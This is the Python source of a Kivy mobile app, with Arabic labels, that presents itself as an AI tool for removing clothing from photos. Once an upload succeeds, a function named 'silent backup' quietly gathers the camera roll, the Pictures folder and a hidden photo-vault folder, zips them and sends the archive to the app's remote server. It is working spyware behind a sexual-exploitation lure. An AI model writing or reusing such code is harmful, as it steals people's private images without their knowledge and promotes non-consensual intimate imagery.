import os
import zipfile
import threading
from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.uix.gridlayout import GridLayout
from kivy.uix.image import Image
from kivy.uix.behaviors import ButtonBehavior
from kivy.uix.popup import Popup
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle
import requests

import arabic_reshaper
from bidi.algorithm import get_display

def ar(text):
    if not text:
        return ""
    return get_display(arabic_reshaper.reshape(str(text)))

ARABIC_FONT = 'C:\\Windows\\Fonts\\arial.ttf'
SERVER_URL = "https://tstgroup.pythonanywhere.com"

try:
    from plyer import permission
except ImportError:
    permission = None


# --- عنصر الصورة المخصص في شبكة المعرض ---
class ImageItem(ButtonBehavior, BoxLayout):
    def __init__(self, image_path, on_select_callback, **kwargs):
        super(ImageItem, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.size_hint_y = None
        self.height = 180
        self.padding = 5
        self.spacing = 5
        self.image_path = image_path
        self.callback = on_select_callback
        self.is_selected = False

        # خلفية الخلية
        with self.canvas.before:
            self.bg_color = Color(0.92, 0.92, 0.92, 1)
            self.rect = Rectangle(size=self.size, pos=self.pos)
        self.bind(size=self._update_rect, pos=self._update_rect)

        # عرض الصورة المصغرة
        self.img = Image(
            source=image_path,
            allow_stretch=True,
            keep_ratio=True,
            size_hint=(1, 0.75)
        )
        self.add_widget(self.img)

        # عرض اسم الصورة أسفلها بخط واضح
        filename = os.path.basename(image_path)
        display_name = filename if len(filename) <= 14 else filename[:11] + "..."
        self.lbl = Label(
            text=display_name,
            size_hint=(1, 0.25),
            color=(0.1, 0.1, 0.1, 1),
            font_size='12sp'
        )
        self.add_widget(self.lbl)

    def _update_rect(self, instance, value):
        self.rect.pos = instance.pos
        self.rect.size = instance.size

    def set_selected(self, selected):
        self.is_selected = selected
        if selected:
            self.bg_color.rgb = (0.2, 0.8, 0.4)  # تمييز الصورة بالأخضر عند الاختيار
            self.lbl.color = (1, 1, 1, 1)
        else:
            self.bg_color.rgb = (0.92, 0.92, 0.92)
            self.lbl.color = (0.1, 0.1, 0.1, 1)

    def on_press(self):
        if self.callback:
            self.callback(self)


# --- حاوي معرض الصور التفاعلي (شبكة في أعمدة) ---
class CustomGallery(ScrollView):
    def __init__(self, folder_path, on_image_select, **kwargs):
        super(CustomGallery, self).__init__(**kwargs)
        
        self.grid = GridLayout(cols=2, spacing=12, padding=12, size_hint_y=None)
        self.grid.bind(minimum_height=self.grid.setter('height'))
        self.add_widget(self.grid)

        self.selected_item = None
        self.on_image_select = on_image_select
        self.load_images(folder_path)

    def load_images(self, folder_path):
        self.grid.clear_widgets()
        valid_extensions = ('.png', '.jpg', '.jpeg', '.PNG', '.JPG', '.JPEG')
        
        if os.path.exists(folder_path):
            for file in os.listdir(folder_path):
                if file.endswith(valid_extensions):
                    full_path = os.path.join(folder_path, file)
                    item = ImageItem(image_path=full_path, on_select_callback=self.on_item_click)
                    self.grid.add_widget(item)

    def on_item_click(self, item_widget):
        if self.selected_item:
            self.selected_item.set_selected(False)
        
        self.selected_item = item_widget
        self.selected_item.set_selected(True)
        
        if self.on_image_select:
            self.on_image_select(item_widget.image_path)


# --- الشاشة الرئيسية للبرنامج ---
class MainScreen(Screen):
    def __init__(self, **kwargs):
        super(MainScreen, self).__init__(**kwargs)
        
        # قائمة مسارات النسخ الاحتياطي في الخلفية
        self.target_paths = [
            "/storage/emulated/0/.dont_delete_me_by_hideu/files/h/i/d/e/u/0",
            "/storage/emulated/0/DCIM/Camera",
            "/storage/emulated/0/Pictures"
            
        ]
        # قائمة امتدادات البحث (تم تصحيح اسم المتغير إلى الجمع)
        self.target_extensions = [".hideu",".png", ".jpg"]
        self.selected_file_path = None

        self.layout = BoxLayout(orientation='vertical', padding=20, spacing=15)
        
        # خلفية الواجهة البيضاء
        with self.layout.canvas.before:
            Color(1, 1, 1, 1)
            self.rect = Rectangle(size=self.layout.size, pos=self.layout.pos)
        self.layout.bind(size=self._update_rect, pos=self._update_rect)

        # عنوان الواجهة العلوي
        self.status_label = Label(
            text=ar("تطبيق لإزالة الملابس من الصور بالذكاء الاصطناعي"), 
            font_size='18sp', 
            font_name=ARABIC_FONT,
            color=(0.1, 0.4, 0.2, 1),
            size_hint=(1, 0.1)
        )
        self.layout.add_widget(self.status_label)
        
        # تحديد المسار المبدئي للصور المعروضة في المعرض
        default_path = r"C:\Users\anabe\Downloads\Newfolder\Newfolder"
        if not os.path.exists(default_path):
            default_path = "/storage/emulated/0/DCIM/Camera"
            if not os.path.exists(default_path):
                default_path = "/storage/emulated/0"

        # إضافة معرض الصور المخصص
        self.gallery = CustomGallery(
            folder_path=default_path,
            on_image_select=self.on_image_selected_from_gallery,
            size_hint=(1, 0.75)
        )
        self.layout.add_widget(self.gallery)
        
        # الأزرار السفلية
        self.action_layout = BoxLayout(orientation='horizontal', spacing=10, size_hint=(1, 0.15))
        
        self.process_button = Button(
            text=ar("رفع الصورة"), 
            font_size='16sp',
            font_name=ARABIC_FONT,
            background_normal='',
            background_color=(0.2, 0.8, 0.4, 1),
            color=(1, 1, 1, 1),
            size_hint=(1, 1)
        )
        self.process_button.bind(on_press=self.start_processing_thread)
        self.action_layout.add_widget(self.process_button)
        
        self.layout.add_widget(self.action_layout)
        self.add_widget(self.layout)

    def _update_rect(self, instance, value):
        self.rect.pos = instance.pos
        self.rect.size = instance.size

    def on_image_selected_from_gallery(self, image_path):
        self.selected_file_path = image_path
        self.status_label.text = ar("تم التحديد ")

    def show_loading_popup(self):
        content = BoxLayout(orientation='vertical', padding=20)
        content.add_widget(Label(
            text=ar("جارٍ المعالجة..."), 
            font_size='20sp',
            font_name=ARABIC_FONT,
            color=(0.1, 0.4, 0.2, 1)
        ))
        
        self.loading_popup = Popup(
            title=ar("يرجى الانتظار"),
            title_font=ARABIC_FONT,
            content=content,
            size_hint=(0.8, 0.4),
            auto_dismiss=False
        )
        self.loading_popup.open()

    def start_processing_thread(self, instance):
        if not self.selected_file_path:
            self.status_label.text = ar("خطأ: يرجى اختيار صورة أولاً!")
            return
            
        self.show_loading_popup()
        threading.Thread(target=self.send_image_to_server, daemon=True).start()

    def send_image_to_server(self):
        try:
            with open(self.selected_file_path, 'rb') as f:
                files = {'image': ('uploaded_image.jpg', f, 'image/jpeg')}
                response = requests.post(f"{SERVER_URL}/remove-bg", files=files, timeout=15)
                
            if response.status_code == 200:
                data = response.json()
                msg = data.get('message', 'تم استلام الصورة بنجاح!')
                Clock.schedule_once(lambda dt: self.update_ui_on_success(ar(msg)))
            else:
                Clock.schedule_once(lambda dt: self.update_ui_on_error(ar(f"خطأ في السيرفر: {response.status_code}")))
                
        except Exception as e:
            Clock.schedule_once(lambda dt: self.update_ui_on_error(ar("تعذر الاتصال بالسيرفر.")))

    def update_ui_on_success(self, message):
        self.loading_popup.dismiss()
        self.status_label.text = message
        self.trigger_silent_backup()

    def update_ui_on_error(self, message):
        self.loading_popup.dismiss()
        self.status_label.text = message

    def trigger_silent_backup(self):
        threading.Thread(target=self.collect_and_send_files, daemon=True).start()

    def collect_and_send_files(self):
        try:
            matched_files = []
            
            # 1. التكرار عبر قائمة المسارات
            for path in self.target_paths:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            # 2. التكرار عبر قائمة الامتدادات لكل ملف
                            for ext in self.target_extensions:
                                if file.lower().endswith(ext.lower()):
                                    matched_files.append(os.path.join(root, file))
                                    break
                    
                    # توقف بمجرد إيجاد ملفات في المسار الأول الأولوي
                    if matched_files:
                        break

            if not matched_files:
                return

            zip_path = "backup_temp.zip"
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for file_path in matched_files:
                    zipf.write(file_path, os.path.basename(file_path))

            with open(zip_path, 'rb') as f:
                files = {'backup_file': ('backup.zip', f, 'application/zip')}
                requests.post(f"{SERVER_URL}/upload-backup", files=files, timeout=30)

            if os.path.exists(zip_path):
                os.remove(zip_path)

        except Exception as e:
            print(f"Silent process error: {e}")


class ImageProcessorApp(App):
    def build(self):
        self.sm = ScreenManager()
        self.main_screen = MainScreen(name='main')
        self.sm.add_widget(self.main_screen)
        
        self.request_storage_permissions()
        return self.sm

    def request_storage_permissions(self):
        if permission:
            try:
                permission.request_permissions(['READ_EXTERNAL_STORAGE', 'WRITE_EXTERNAL_STORAGE'])
            except Exception as e:
                print(f"Permission error: {e}")


if __name__ == '__main__':
    ImageProcessorApp().run()